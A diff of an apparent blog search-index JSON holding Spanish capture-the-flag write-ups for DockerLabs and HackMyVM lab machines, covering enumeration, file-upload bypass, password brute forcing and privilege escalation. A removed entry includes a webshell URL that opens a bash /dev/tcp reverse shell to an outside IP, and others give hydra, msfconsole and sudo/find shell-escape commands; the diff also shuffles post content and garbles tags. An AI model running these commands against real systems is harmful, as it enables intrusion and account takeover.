@@ -1,61 +1,10 @@
 [
   
   {
-    "title": "Hidden , DockerLabs",
-    "url": "/posts/hidden-docker/",
-    "categories": "DockerLabs",
-    "tags": "ctf, hacking, etico",
-    "date": "2024-04-27 00:00:00 -0300",
-    
-
-
-
-
-
-    
-    "snippet": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema  , enumeracion con con gobuster y busqueda de subdominios con wfuzz , revshell , movimientos laterales y escal...",
-    "content": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema  , enumeracion con con gobuster y busqueda de subdominios con wfuzz , revshell , movimientos laterales y escalada final.Herramientas y recursos usados  nmap  gobuster  wfuzzEnumeracionEmpezamos lanzando un nmap contra el objetivo , el cual nos devuelve que solo se encuentra el 80 abierto y podemos ver como nos dice que no consigue llegar a hidden.labsudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX hidden_nmap Reporte nmapAntes de poder revisar la web debemos añadir lo que nos dice nmap al fichero hosts , tambiem aprovechamos y lanzamos gobuster por si encuentra algo.nvim /etc/hostsUna vez editado el fichero vamos a trabajar.gobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://hidden.lab --exclude-length 3690Despues de estar un rato mirando la web que creo que es un bootstrap simplemente y hacerme un lio con el formulario de reserva y la ruta que devolvia desisto y pienso que debe haber algo mas, hemos fuzeado directorios con el comando anterior , hemos  revisado la web un buen rato sin frutos asi que vamos a buscar si tuviera algun host virtual.Como no sabia como excluir los errores en gobuster tiro de wfuzz.wfuzz -c -w /usr/share/dirbuster/directory-list-2.3-medium.txt --hc 400,404,403,302 -H \"Host: FUZZ.hidden.lab\" -u http://hidden.lab -t 100Agregamos de nuevo al fichero hosts el virtualhost que nos da wfuzz y pasamos a ver esa otra web.Nos encontramos una subida de archivos y nos indica que un .php no podemos subir , a buscar extensiones que se ejecuten.Primer intento fallido asi que deduzco que apache debe comprobar que es lo que ejecuta y si no coincide chauuuuDocumentacion phpDespues de probar a subir un .phar lo ha subido sin promblema , averiguamos ahora donde esta asi que otra vez a gobustergobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://dev.hidden.lab --exclude-length 3690InfiltracionAhora parece estar todo listo el rce y la ruta asi que probamos y acepta comandos a por la revshell.http://dev.hidden.lab/uploads/rce.phar?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.0.112/443%200%3E%261%22Como vemos en la imagen tenemos varios usuarios despues de buscar scripts , suid , sudo , etc no obtengo nada asi que hay que hacer fuerza bruta , busco un script que hizo el pinguino que era para eso linux brute.Por otro lado no podemos subirnos el rockyou completo asi que lo despiezamos y lo subimos por el webupload.Comando para dividir por numero de lineassplit -l 1000 rockyou.txt parte_Ahora que tenemos todo subido al menos la primera parte del rockyou lanzaremos el script y esperemos que la pass este arriba del fichero si no mi paciencia explota porque va de 1000 en 1000.Nos desplazamos al directorio dnd se han subido los archivos y lo ejecutamos con las 1000 pass primeras../Linux-Su-Force.sh cafetero tudiccionarioEscalada de privilegiosSi os fijais en la imagen de arriba podeis ver la importancia de configurar bien la revshell.Por cierto ataco a cafetero por la relacion clara con la web.Pasamos al user cafetero recordamos que hay varios usarios y se debe tratar de ir de uno a otro hasta root.su cafeteroRevisamos como siempre y las veces que necesitemos por cada usuario permisos , scripts , directorios hasta encontrar algo.Con sudo tenemos suerte.Como vemos podemos ejecutar nano como usuario john.Consultamos gtofbins de ser necesario.sudo -u john nanoRepetimos proceso  este usuario “john” con find , sudo  etc en busca de scripts binarios etc..sudo -l En este caso hacemos uso de apt buscamos en searchbins y adelante.Ahora como usuario bobby repetimos de nuevo el proceso.sudo -lAhora vemos que podemos hacer root con findsudo find . -exec /bin/sh \\; -quitGracias por leer y si alguien que lee esto y sabe porque se me vuelve tan loca la terminal agradeceria ayuda.Saludos"
-  },
-  
-  {
-    "title": "walkingcms , DockerLabs",
-    "url": "/posts/walkingcms/",
-    "categories": "DockerLabs",
-    "tags": "ctf, hacking, etico",
-    "date": "2024-04-26 00:00:00 -0300",
-    
-
-
-
-
-
-    
-    "snippet": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema , fuzzing , fuerza bruta y escalada.Herramientas y recursos usados  nmap  feroxbuster  wpscan-searchbinsEnumer...",
-    "content": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema , fuzzing , fuerza bruta y escalada.Herramientas y recursos usados  nmap  feroxbuster  wpscan-searchbinsEnumeracionEmpezamos lanzando un nmap contra el objetivo , el cual nos devuelve que solo se encuentra el 80 abierto , podemos ver la web mientras hacemos fuzzing de directorios.Reporte nmapferoxbuster -t 200 -x php,txt,html -u http://172.17.0.2 En el root del 80 solo vemos la web por defecpo de apache , pero el feroxbuster nos encuentra que estamos frente a un wordpress.Revisemos mas a fondo ese wordpress lo primero que se me ocurre es el xmlrcp.php , pero vamos de a poco tirando wpscan.Realizamos enumeracion de usuarios y versiones de plugins.wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vpComo vemos tenemos un usuario y nos indica que podemos seguir por el theme una vez hallemos la contraseña para el user mario.Desde este punto nos encontramos con distintas formas de proceder.Una de ellas es con uso de scripts que puedes crear tu mismo o buscar por github , yo me decanto en este punto por msfconsole.ya dentro de msf ejecutamos lo siguiente.search xmlrpcuse 9set PASS_FILE /home/quino/rockyou.txtset USERNAME marioset RHOST http://172.17.0.2set TARGETURI wordpress/xmlrpc.phprunInfiltracionAhora ya con el user y el pass nos vamos al login y empezamos a trabajar el theme susceptible.Vamos a theme editor y buscamos el index , en ese index le colocamos el codigo de una webshell yo tiro con  webshell por probar.Una vez modificado, guardo el index y podemos ir a cargarlo en la web.http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.phpLlegados a este punto nos ponemos a la escucha con nc y nos mandamos una revshell desde la webshell.Recibida la revshell empezamos a averiguar como escalar privilegios, lanzamos sudo , find para empezar.Sudo no esta y con find obtenemos resultados.Tenemos env al lio.Ejecutamos como nos indicaenv /bin/sh -pGracias por leer.Dudas o cuestiones en los comentarios.Saludos"
-  },
-  
-  {
-    "title": "Hackpenguin , DockerLabs",
-    "url": "/posts/hackpenguin/",
-    "categories": "DockerLabs",
-    "tags": "ctf, hacking, etico",
-    "date": "2024-04-26 00:00:00 -0300",
-    
-
-
-
-
-
-    
-    "snippet": "En este reto nos encontramos con el tipico escaneo de puertos para buscar una entrada al sistema , fuzzing , steganografiaHerramientas y recursos usados  nmap  gobuster  stegseekEnumeracionEmpezamo...",
-    "content": "En este reto nos encontramos con el tipico escaneo de puertos para buscar una entrada al sistema , fuzzing , steganografiaHerramientas y recursos usados  nmap  gobuster  stegseekEnumeracionEmpezamos lanzando un nmap contra el objetivo , el cual nos devuelve como puertos abiertos el shh y el http.Reporte nmapMientras revisamos la pagina por default en el 80 , lanzamos gobuster por si encuentra algo.gobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://172.17.0.2 --exclude-length 3690Tenemos suerte con gobuster y nos da penguin.html , revisamos la pagina y no hay nada asi que descargamos la imagen por si esconde algo.Usamos steseekstegseek penguin.jpg ../rockyou.txtComo vemos nos da un passphrase y otro fichero , probamos a abrir el fichero con ese passphrase con resultado negativo.Asi que vamos a por el intento de hashsear el fichero y tirar con johnkeepass2john penguin1.kdbx &gt; penguin.txtUna vez tenemos el hash se lo damos a john.Yo lo ejecuto desde un binario compilado por mi en local../john penguin.txtCon la pass que nos tira john abrimos el kdbx para ver que passwords guarda.InfiltracionRecordamos que tenemos chocolate password1 “que ya la usamos” y la que nos ha dado el fichero.Hora de conectar o intentarlo contra ssh con los datos que tenemos.No tenemos suerte en las primeras pruebas manuales , pruebo con otro user que pienso que puede ser el nombre del archivo kdbx.ssh penguin@172.17.0.2Escalada de privilegiosComo de costumbre y mas rapido primero ejuctamos sudo y find como corresponde y niguno devuelve nada que sirva.Revisamos los directorios donde tenemos acceso y encontramos un script que podria servirnos .Tambien podriamos usar find para buscar scripts que podamos modificar.find / -user root -type f -name *.sh 2&gt;/dev/nullUna vez encontrado el script debemos de ver cuando se ejecuta y si se ejecuta.ps -aux | grep rootVemos que lo esta ejecutando asi que lo vamos a editar solo esta nano en la maquina.  Yo aqui no consegui acabar como root pese a haber seguido al final los writeupsUna vez editado esperemos a que lo ejecute y con el siguiente comando ejecutamos el binario modificado de permisos fraudulentamente.bash -p   Jamas consegui que se ejecutara el script pienso que algo fallo ni idea , bo obstante la gente la ahce de ese modo.Gracias por leer."
-  },
-  
-  {
     "title": "Capypenguin , DOCKERLABS",
     "url": "/posts/capypenguin/",
-    "categories": "DockerLabs",
-    "tags": "cft, hacking, etico",
+    "categories": "",
+    "tags": "",
     "date": "2024-04-25 00:00:00 -0300",
     
 
@@ -72,7 +21,7 @@
     "title": "Nmap basico bien explicado",
     "url": "/posts/Nmap_basico/",
     "categories": "Software",
-    "tags": "herramientas",
+    "tags": "cft, hacking, etico",
     "date": "2024-04-25 00:00:00 -0300",
     
 
@@ -81,14 +30,14 @@
 
 
     
-    "snippet": "Para comenzar, es esencial familiarizarse con algunos comandos básicos de Nmap. A continuación, se presenta una breve descripción de algunos de los más utilizados:nmap -A &lt;objetivo&gt;: Realiza ...",
-    "content": "Para comenzar, es esencial familiarizarse con algunos comandos básicos de Nmap. A continuación, se presenta una breve descripción de algunos de los más utilizados:nmap -A &lt;objetivo&gt;: Realiza un escaneo completo del objetivo especificado, incluyendo la detección del sistema operativo, la detección de servicios y la detección de versiones.nmap -p &lt;rango_de_puertos&gt; &lt;objetivo&gt;: Escanea un rango específico de puertos en el objetivo indicado.nmap -sT &lt;objetivo&gt;: Realiza un escaneo TCP SYN, útil para identificar hosts activos.nmap -sU &lt;objetivo&gt;: Realiza un escaneo UDP, útil para identificar hosts que ejecutan servicios UDP.nmap -v &lt;objetivo&gt;: Aumenta el nivel de verbosidad de la salida.Ejemplos de usoPara ilustrar el uso de Nmap, consideremos algunos ejemplos prácticos:Escaneo completo de un host:nmap -A 192.168.1.100Escaneo de un rango de puertos:nmap -p 1-1000 192.168.1.0/24Escaneo TCP SYN:nmap -sT 192.168.1.0/24Escaneo UDP:nmap -sU 192.168.1.0/24Escaneo detallado con verbosidad alta:nmap -v 192.168.1.100Uso de scriptsNmap ofrece la posibilidad de ampliar sus funcionalidades mediante la utilización de scripts. Estos scripts permiten realizar tareas específicas, como la detección de vulnerabilidades o la identificación de software instalado. Para utilizar scripts, es necesario contar con la biblioteca Nmap Scripting Engine (NSE).ConclusiónNmap se posiciona como una herramienta fundamental para la exploración de redes y la auditoría de seguridad en entornos Linux. Su amplia gama de comandos y la posibilidad de utilizar scripts la convierten en un recurso invaluable para profesionales de la informática y la seguridad. La comprensión de los conceptos básicos de Nmap y su aplicación práctica permiten obtener información crucial sobre la infraestructura de red y detectar posibles vulnerabilidades.Recursos adicionalesPágina oficial de Nmap: https://nmap.org/downloadDocumentación de Nmap: https://nmap.org/docs.htmlTutoriales de Nmap: https://www.freecodecamp.org/news/what-is-nmap-and-how-to-use-it-a-tutorial-for-the-greatest-scanning-tool-of-all-time/"
+    "snippet": "Este es un reto clasificado como de dificultad easymuy facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada...",
+    "content": "Este es un reto clasificado como de dificultad easymuy facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , explotacion de ssh por fuerza bruta , movimiento lateral entre usuarios y escalada de privelegios.HERRAMIENTAS Y RECURSOS USADOS  nmap  hydra  searchbinsEnumeracionComo al arrancar la maquina ya nos dice la ip , nos olvidamos de arp-scan , comprobamos la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oX puertosReporteObservamos el resultado y vemos que solo tiene el 22 y el 80 abiertos .Empecemos por revisar la web y nos encontramos con una web totalmente en blanco asi que directos a ver la fuente.Empezamos por un ataque de fuerza bruta contra el usario camilo porque contra camilo pq entiendo que el receptor del mail es un usario seguro de la maquina.hydra -l camilo -P rockyou.txt -vV 172.17.02 sshInfiltraciónAhora que ya tenemos todo listo pasamos a conectarnos a la maquina con el usario y la contraseña proporcionada por hydra.Escalada de privilegiosUna vez dentro listamos directorios importantes y tambien lo primero es ejecutar como de costumbre find y sudo que nos buscaran ficheros con permisos erroneos.find / -perm -4000 2&gt;/dev/nullsudo -lComo vemos ninguno de los dos comandos nos arroja luz pero recordemos lo que tenemos hasta ahora la web y los users y la web nos hablaba de juan y un correo a camilo.Momento de buscar el mail.cat /var/mail/camilo.txtAhi tenemos en texto plano la pass de juan , accedamossu juanUna vez como juan volvemos a usar sudo y find y esta vez tenemos positivo con ruby.sudo -lPobre pedro no pasamos por su cuenta , no nos va a dar acceso o si ya eres root.Gracias por leer"
   },
   
   {
     "title": "Upload , DOCKERLABS",
     "url": "/posts/upload/",
-    "categories": "DockerLabs",
+    "categories": "",
     "tags": "cft, hacking, etico",
     "date": "2024-04-23 00:00:00 -0300",
     
@@ -105,7 +54,7 @@
   {
     "title": "Vacaciones , DOCKERLABS",
     "url": "/posts/vacaciones/",
-    "categories": "DockerLabs",
+    "categories": "",
     "tags": "cft, hacking, etico",
     "date": "2024-04-22 00:00:00 -0300",
     
@@ -139,8 +88,8 @@
   {
     "title": "Domain , DOCKERLABS",
     "url": "/posts/domain/",
-    "categories": "DockerLabs",
-    "tags": "cft, hacking, etico",
+    "categories": "",
+    "tags": "cft, ,, hacking, ,, etico, ,",
     "date": "2024-04-21 00:00:00 -0300",
     
 
@@ -156,8 +105,8 @@
   {
     "title": "Pyred , DOCKERLABS",
     "url": "/posts/pyred/",
-    "categories": "DockerLabs",
-    "tags": "cft, hacking, etico",
+    "categories": "",
+    "tags": "",
     "date": "2024-04-19 00:00:00 -0300",
     
 
@@ -173,7 +122,7 @@
   {
     "title": "Alzheimer, HACKMYVM",
     "url": "/posts/alzheimer/",
-    "categories": "HackMyVm",
+    "categories": "HackMyVM",
     "tags": "",
     "date": "2023-11-27 00:00:00 -0300",
     
@@ -190,7 +139,7 @@
   {
     "title": "Hidden, HACKMYVM",
     "url": "/posts/hidden/",
-    "categories": "HackMyVm",
+    "categories": "",
     "tags": "",
     "date": "2023-11-26 00:00:00 -0300",
     
@@ -207,7 +156,7 @@
   {
     "title": "Twisted, HACKMYVM",
     "url": "/posts/twisted/",
-    "categories": "HackMyVm",
+    "categories": "",
     "tags": "",
     "date": "2023-11-25 00:00:00 -0300",
     
@@ -224,7 +173,7 @@
   {
     "title": "Method, HACKMYVM",
     "url": "/posts/method/",
-    "categories": "HackMyVm",
+    "categories": "",
     "tags": "",
     "date": "2023-11-16 00:00:00 -0300",
     
@@ -241,7 +190,7 @@
   {
     "title": "Friendly, HACKMYVM",
     "url": "/posts/friendly/",
-    "categories": "HackMyVm",
+    "categories": "",
     "tags": "",
     "date": "2023-11-16 00:00:00 -0300",
     
@@ -258,7 +207,7 @@
   {
     "title": "Drifting Blues 3 , HACKMYVM",
     "url": "/posts/driftingblues3/",
-    "categories": "HackMyVm",
+    "categories": "",
     "tags": "",
     "date": "2023-11-16 00:00:00 -0300",
     
